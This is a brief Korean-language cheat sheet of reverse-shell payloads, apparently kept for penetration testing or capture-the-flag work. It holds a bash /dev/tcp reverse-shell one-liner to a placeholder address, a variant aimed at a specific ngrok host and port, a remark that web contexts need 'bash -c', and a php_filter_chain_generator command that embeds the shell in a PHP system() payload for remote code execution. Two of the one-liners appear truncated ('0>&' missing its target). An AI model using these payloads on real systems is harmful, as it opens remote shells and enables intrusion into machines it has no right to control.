# 모음
```
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```

- 웹에서 파일 디스크립션 오류 땜시 bash -c을 사용해야한다고 함

```
bash -c "sh -i >& /dev/tcp/0.tcp.jp.ngrok.io/19954 0>&"
```


```
python3 php_filter_chain_generator.py --chain '<?php system("bash -c \'sh -i >& /dev/tcp/0.tcp.jp.ngrok.io/19954 0>&\'"); ?> '
```